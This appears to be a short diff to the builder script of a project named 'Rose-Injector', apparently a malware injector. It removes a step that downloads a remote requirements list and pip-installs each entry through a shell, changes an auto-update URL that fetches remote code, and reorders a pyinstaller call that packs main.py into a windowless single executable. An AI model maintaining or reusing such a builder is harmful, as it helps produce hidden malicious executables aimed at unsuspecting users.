@@ -7,26 +7,6 @@ __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/to
 
 import tkinter
 from tkinter import messagebox
-
-tkinter.messagebox.showinfo(title="Requirements!", message="We are installing all the requirements/prerequisites in the background now. This can take a few minutes to complete.", )
-
-def requirementsinstallation():
-    try:
-        import requests
-    except Exception:
-        import subprocess
-        subprocess.run("python -m pip install requests", shell=True)
-
-    import requests
-    import subprocess
-    import os
-    
-    requirementsurl = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/scrapedata/requirements.txt").text
-    spliee = requirementsurl.split()
-    for split in spliee:
-        subprocess.run(f"python -m pip install {split}", shell=True)
-
-requirementsinstallation()
     
 import requests
 import os
@@ -44,7 +24,7 @@ from PyQt5.QtCore import QRunnable, QThreadPool, QObject, pyqtSignal as Signal, 
     
 def auto_update():
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose_builder.pyw"
+            "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose_builder.py"
     )
     
     code = requests.get(_code, timeout=10).text
@@ -154,7 +134,7 @@ class Runnable_wf(QRunnable):
                 f.write(new)
                 
     def compile(self):
-        os.system(f'pyinstaller --noconsole --onefile "{self.path}/main.py"')
+        os.system(f'pyinstaller "{self.path}/main.py" --noconsole --onefile')
         
     def move_dir(self): 
         shutil.move(f"dist\\main.exe", f"{self.dir_name}.exe")
